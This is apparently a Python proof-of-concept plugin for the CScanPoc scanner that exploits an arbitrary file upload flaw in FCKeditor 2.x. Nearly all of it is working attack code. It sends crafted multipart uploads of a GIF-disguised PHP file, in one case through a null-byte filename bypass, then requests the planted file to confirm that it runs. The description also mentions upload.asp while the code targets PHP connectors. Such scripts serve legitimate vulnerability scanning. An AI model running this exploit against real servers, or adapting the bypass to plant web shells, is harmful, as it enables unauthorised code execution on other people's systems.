# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FCKeditor_0002'  # 平台漏洞编号，留空
    name = 'FCKeditor 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        FCKeditor 2.6版本, upload.asp文件为黑名单过滤, 可绕过上传。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FCKeditor'  # 漏洞应用名称
    product_version = '2.6版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '18c10a27-c98f-4c5b-bea2-e9b1e80083b8'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def fck2_4_3(self, host):
        '''
        fckeditor版本 <= 2.4.3
        '''
        hh = hackhttp.hackhttp()
        path = "/fckeditor2.6/editor/filemanager/upload/php/upload.php?Type=Media"
        data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
        data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ssdlh.php\"\r\n"
        data += "Content-Type: image/jpeg\r\n\r\n"
        data += "GIF89a<?php print(md5(521521));?>\r\n"
        data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
        head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
        url = host + path
        code, head, body, ecode, redirect_url = hh.http(
            url, headers=head, data=data)
        if code == 200:
            shell = re.findall("eted\(\d+,\"(.+?.php)\"", body)
            if shell:
                phpurl = host+'../'+shell[0]
                code, head, body, ecode, redirect_url = hh.http(phpurl)
                if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                    #security_hole('upload vulnerable:%s' % phpurl)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                # else:
                    #security_info('maybe vulnerable:%s' % phpurl)

    def fck2_6_4(self, host):
        '''
        fckeditor 版本 介于2.4.3与2.6.4之间（不包括2.4.3）
        '''
        hh = hackhttp.hackhttp()
        path = "/fckeditor2.6/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=ssdlh.php%00.jpg"
        data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
        data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"a.jpg\"\r\n"
        data += "Content-Type: image/jpeg\r\n\r\n"
        data += "GIF89a<?php print(md5(521521));?>\r\n"
        data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
        head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
        url = host + path
        code, head, body, ecode, redirect_url = hh.http(
            url, headers=head, data=data)
        if code == 200:
            shell = re.findall("eted\(\d+,\"(.+?\.php)", body)
            if shell:
                phpurl = host+'../'+shell[0]
                code, head, body, ecode, redirect_url = hh.http(phpurl)
                if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
                    #security_hole('upload vulnerable:%s' % phpurl)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                # else:
                    #security_info('maybe vulnerable:%s' % phpurl)

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            self.fck2_4_3(self.target)
            self.fck2_6_4(self.target)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
